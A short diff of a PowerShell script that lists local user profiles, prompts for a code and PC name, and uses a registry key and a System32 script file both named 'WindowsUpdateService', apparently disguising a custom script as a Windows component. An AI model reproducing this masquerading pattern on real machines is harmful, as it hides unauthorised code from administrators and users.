@@ -1,5 +1,5 @@
 $regPath = "HKLM:\Software\WindowsUpdateService"
-$userNames = ($userProfiles | ForEach-Object { $_.LocalPath?.Split('\')[-1] }) -join "|"
+$userNames = Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }
 $code = Read-Host "Enter the code"
 $name = Read-Host "Type in the Name of the PC"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
